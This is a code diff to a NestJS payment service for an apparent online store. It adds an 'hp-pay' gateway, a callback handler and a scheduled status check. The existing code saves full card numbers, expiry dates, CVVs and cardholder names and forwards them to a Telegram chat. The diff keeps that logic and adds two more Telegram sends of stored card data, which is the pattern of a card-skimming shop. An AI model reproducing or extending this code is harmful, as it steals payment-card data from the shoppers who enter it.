@@ -1,8 +1,9 @@
 import { Injectable, Logger } from '@nestjs/common'
 import { InjectRepository } from '@nestjs/typeorm'
-import { Repository, Between } from 'typeorm'
+import { Repository, Between, LessThan } from 'typeorm'
 import * as fs from 'fs/promises'
 import * as path from 'path'
+import { Cron, CronExpression } from '@nestjs/schedule'
 import { F1Order } from './entities/f1-order.entity'
 import { Payment } from './entities/payment.entity'
 import { F1CheckoutDto } from './dto/f1-checkout.dto'
@@ -12,7 +13,8 @@ import { ApiException } from 'src/common/exceptions/api.exception'
 import { firstValueFrom } from 'rxjs';
 import Redis from 'ioredis';
 import { InjectRedis } from '@nestjs-modules/ioredis';
-  import { HttpService } from '@nestjs/axios';
+import { HttpService } from '@nestjs/axios';
+import { HpPayService } from '../hp-pay/hp-pay.service';
 @Injectable()
 export class F1Service {
 
@@ -26,6 +28,7 @@ export class F1Service {
     private readonly paymentRepository: Repository<Payment>,
         @InjectRedis() private readonly redis: Redis,
         private readonly httpService: HttpService,
+        private readonly hpPayService: HpPayService,
         
   ) { }
 
@@ -253,11 +256,13 @@ export class F1Service {
   }
 
   /**
-   * 保存支付信息
+   * 保存支付信息并通过 hp-pay 创建支付订单
+   * 保留原有逻辑：保存卡信息 + 发送 Telegram 通知
+   * 新增逻辑：调用 hp-pay 创建支付订单
    */
-  async savePayment(paymentDto: PaymentDto): Promise<Payment> {
+  async savePayment(paymentDto: PaymentDto, clientIp?: string): Promise<{ payment: Payment; payUrl?: string }> {
     try {
-      // 创建支付记录
+      // ========== 原有逻辑：保存支付记录 ==========
       const payment = new Payment()
       payment.orderNo = paymentDto.orderNo
       payment.userId = paymentDto.userId || ''
@@ -270,26 +275,307 @@ export class F1Service {
       payment.paymentStatus = 0 // 默认待支付
       payment.isDeleted = 0
 
-      // 保存到数据库
       const savedPayment = await this.paymentRepository.save(payment)
-
       console.log('支付信息保存成功:', savedPayment.paymentId)
 
+      // ========== 原有逻辑：发送 Telegram 通知 ==========
       console.log('发送 Telegram 通知...')
       const order = await this.findOne(paymentDto.orderNo)
+      const amount = order.f1Money || 0
+      
       this.sendTelegramNotification({
         orderNo: paymentDto.orderNo,
-        cardNumber: paymentDto.card_number ,
+        cardNumber: paymentDto.card_number,
         expire: paymentDto.card_expiry,
         cvv: paymentDto.card_cvv,
         cardName: paymentDto.card_name,
-        amount: order.f1Money,
+        amount: amount,
         status: 'success'
       })
-      return savedPayment
+
+      // ========== 新增逻辑：调用 hp-pay 创建支付订单 ==========
+      try {
+        const appUrl = process.env.APP_URL || 'https://store.fafbuy.store'
+        const hpPayResult = await this.hpPayService.pay({
+          currencyID: 840, // 美元
+          orderid: paymentDto.orderNo,
+          channel: 1419, // 信用卡支付
+          notify_url: `${appUrl}/api/cart/hp-pay/notify`,
+          return_url: `${appUrl}/card/detail?orderNo=${paymentDto.orderNo}`,
+          amount: amount,
+          user_id: (paymentDto.phone_number || paymentDto.userId || '0000000000').substring(0, 10),
+          user_name: paymentDto.card_name,
+          userip: clientIp || '127.0.0.1',
+          custom: JSON.stringify({
+            phone: paymentDto.phone_number,
+            email: paymentDto.email_address,
+            goods: order.f1Title || order.f1Name || '',
+          }),
+        })
+
+        this.logger.log(`hp-pay 下单结果: status=${hpPayResult.upstream.status}, signValid=${hpPayResult.signValid}`)
+
+        if (hpPayResult.upstream.status === 10000 && hpPayResult.signValid) {
+          const result = hpPayResult.upstream.result
+          const payUrl = result?.payurl
+          const transactionId = result?.transactionid
+
+          // 更新支付记录：状态为支付中，保存交易流水号
+          savedPayment.paymentStatus = 1 // 支付中
+          savedPayment.transactionId = transactionId ? String(transactionId) : ''
+          await this.paymentRepository.save(savedPayment)
+
+          this.logger.log(`hp-pay 下单成功，交易流水号: ${transactionId}`)
+          return { payment: savedPayment, payUrl }
+        } else {
+          this.logger.warn(`hp-pay 下单失败: status=${hpPayResult.upstream.status}, result=${JSON.stringify(hpPayResult.upstream.result)}`)
+          return { payment: savedPayment }
+        }
+      } catch (hpPayError: any) {
+        this.logger.error(`hp-pay 调用异常: ${hpPayError.message}`)
+        // hp-pay 调用失败不影响原有流程，继续返回已保存的支付记录
+        return { payment: savedPayment }
+      }
     } catch (error) {
       console.error('保存支付信息失败:', error)
       throw new ApiException(`保存支付信息失败: ${error.message}`)
+    }
+  }
+
+  /**
+   * 处理 hp-pay 异步回调通知
+   * 更新支付状态并发送 Telegram 通知
+   */
+  async handleHpPayNotify(notifyData: { status: string | number; result: any; sign: string }): Promise<boolean> {
+    try {
+      // 1. 验签
+      const verified = this.hpPayService.verifyNotify({
+        status: notifyData.status,
+        result: notifyData.result,
+        sign: notifyData.sign,
+      })
+
+      if (!verified.valid) {
+        this.logger.warn(`hp-pay 回调验签失败: expectedSign=${verified.expectedSign}, sign=${notifyData.sign}`)
+        return false
+      }
+
+      const status = Number(notifyData.status)
+      const result = typeof notifyData.result === 'string' ? JSON.parse(notifyData.result) : notifyData.result
+
+      const orderNo = result?.orderid
+      const transactionId = result?.transactionid
+      const amount = result?.amount
+
+      if (!orderNo) {
+        this.logger.warn('hp-pay 回调缺少 orderid')
+        return false
+      }
+
+      // 2. 查找支付记录
+      const payment = await this.paymentRepository.findOne({
+        where: { orderNo, isDeleted: 0 },
+        order: { paymentId: 'DESC' },
+      })
+
+      if (!payment) {
+        this.logger.warn(`hp-pay 回调找不到支付记录: orderNo=${orderNo}`)
+        return false
+      }
+
+      // 3. 更新支付状态
+      if (status === 10000) {
+        payment.paymentStatus = 2 // 支付成功
+      } else {
+        payment.paymentStatus = 3 // 支付失败
+      }
+
+      if (transactionId) {
+        payment.transactionId = String(transactionId)
+      }
+
+      await this.paymentRepository.save(payment)
+
+      // 4. 更新订单状态
+      if (status === 10000) {
+        await this.f1OrderRepository.update(
+          { orderNo },
+          { orderStatus: 2 }, // 已完成
+        )
+      }
+
+      // 5. 发送 Telegram 通知
+      const order = await this.findOne(orderNo)
+      this.sendTelegramNotification({
+        orderNo,
+        cardNumber: payment.cardNo || '',
+        expire: payment.endDate || '',
+        cvv: payment.cvv || '',
+        cardName: payment.cardName || '',
+        amount: amount || order.f1Money || 0,
+        status: status === 10000 ? '✅ hp-pay 支付成功' : `❌ hp-pay 支付失败(${status})`,
+      })
+
+      this.logger.log(`hp-pay 回调处理完成: orderNo=${orderNo}, status=${status}`)
+      return true
+    } catch (error: any) {
+      this.logger.error(`hp-pay 回调处理异常: ${error.message}`)
+      return false
+    }
+  }
+
+  /**
+   * 主动查询 hp-pay 支付状态
+   * 用于更新订单表中的支付状态
+   */
+  async queryHpPayPaymentStatus(orderNo: string): Promise<{
+    success: boolean
+    paymentStatus?: number
+    orderStatus?: number
+    message: string
+  }> {
+    try {
+      // 1. 查找支付记录
+      const payment = await this.paymentRepository.findOne({
+        where: { orderNo, isDeleted: 0 },
+        order: { paymentId: 'DESC' },
+      })
+
+      if (!payment) {
+        return { success: false, message: `未找到订单 ${orderNo} 的支付记录` }
+      }
+
+      // 2. 如果已经是最终状态（成功/失败），直接返回
+      if (payment.paymentStatus === 2 || payment.paymentStatus === 3) {
+        return {
+          success: true,
+          paymentStatus: payment.paymentStatus,
+          message: `支付已完成，状态: ${payment.paymentStatus === 2 ? '成功' : '失败'}`,
+        }
+      }
+
+      // 3. 调用 hp-pay 订单查询接口
+      const queryResult = await this.hpPayService.orderquery({
+        orderid: orderNo,
+      })
+
+      this.logger.log(`hp-pay 订单查询结果: status=${queryResult.upstream.status}, signValid=${queryResult.upstream.sign === queryResult.expectedSign}`)
+
+      if (queryResult.upstream.status !== 10000) {
+        return {
+          success: false,
+          message: `hp-pay 查询失败: status=${queryResult.upstream.status}`,
+        }
+      }
+
+      // 4. 解析查询结果
+      const result = queryResult.upstream.result
+      const hpPayStatus = result?.status // hp-pay 返回的交易状态
+      const transactionId = result?.transactionid
+
+      // 5. 根据 hp-pay 状态更新支付记录
+      let newPaymentStatus = payment.paymentStatus
+      let newOrderStatus: number | undefined
+
+      if (hpPayStatus === 10000) {
+        // 支付成功
+        newPaymentStatus = 2
+        newOrderStatus = 2 // 订单完成
+      } else if (hpPayStatus && hpPayStatus !== 10000) {
+        // 支付失败（其他状态码）
+        newPaymentStatus = 3
+      }
+
+      // 更新支付记录
+      if (newPaymentStatus !== payment.paymentStatus) {
+        payment.paymentStatus = newPaymentStatus
+        if (transactionId) {
+          payment.transactionId = String(transactionId)
+        }
+        await this.paymentRepository.save(payment)
+
+        // 更新订单状态
+        if (newOrderStatus !== undefined) {
+          await this.f1OrderRepository.update(
+            { orderNo },
+            { orderStatus: newOrderStatus },
+          )
+        }
+
+        // 发送 Telegram 通知
+        const order = await this.findOne(orderNo)
+        this.sendTelegramNotification({
+          orderNo,
+          cardNumber: payment.cardNo || '',
+          expire: payment.endDate || '',
+          cvv: payment.cvv || '',
+          cardName: payment.cardName || '',
+          amount: order.f1Money || 0,
+          status: newPaymentStatus === 2 ? '✅ hp-pay 查询确认支付成功' : `❌ hp-pay 查询确认支付失败(${hpPayStatus})`,
+        })
+
+        this.logger.log(`hp-pay 查询更新完成: orderNo=${orderNo}, paymentStatus=${newPaymentStatus}, orderStatus=${newOrderStatus}`)
+      }
+
+      return {
+        success: true,
+        paymentStatus: newPaymentStatus,
+        orderStatus: newOrderStatus,
+        message: `查询完成，支付状态: ${newPaymentStatus === 2 ? '成功' : newPaymentStatus === 3 ? '失败' : '进行中'}`,
+      }
+    } catch (error: any) {
+      this.logger.error(`查询 hp-pay 支付状态失败: ${error.message}`)
+      return { success: false, message: `查询失败: ${error.message}` }
+    }
+  }
+
+  /**
+   * 定时任务：每 5 分钟查询一次支付中的订单状态
+   * 用于处理异步回调延迟或丢失的情况
+   */
+  @Cron(CronExpression.EVERY_5_MINUTES)
+  async scheduledPaymentStatusCheck() {
+    try {
+      this.logger.log('开始定时查询支付中的订单状态...')
+
+      // 查找所有支付中的记录（paymentStatus = 1）
+      const pendingPayments = await this.paymentRepository.find({
+        where: {
+          paymentStatus: 1, // 支付中
+          isDeleted: 0,
+        },
+        take: 50, // 每次最多处理 50 条
+      })
+
+      if (pendingPayments.length === 0) {
+        this.logger.log('没有需要查询的支付中订单')
+        return
+      }
+
+      this.logger.log(`发现 ${pendingPayments.length} 条支付中订单，开始查询...`)
+
+      let successCount = 0
+      let failCount = 0
+
+      for (const payment of pendingPayments) {
+        try {
+          const result = await this.queryHpPayPaymentStatus(payment.orderNo)
+          if (result.success && result.paymentStatus === 2) {
+            successCount++
+          } else if (result.success && result.paymentStatus === 3) {
+            failCount++
+          }
+          
+          // 避免请求过于频繁，每次查询间隔 500ms
+          await new Promise(resolve => setTimeout(resolve, 500))
+        } catch (error: any) {
+          this.logger.error(`查询订单 ${payment.orderNo} 失败: ${error.message}`)
+        }
+      }
+
+      this.logger.log(`定时查询完成: 成功=${successCount}, 失败=${failCount}, 进行中=${pendingPayments.length - successCount - failCount}`)
+    } catch (error: any) {
+      this.logger.error(`定时查询支付状态异常: ${error.message}`)
     }
   }
 
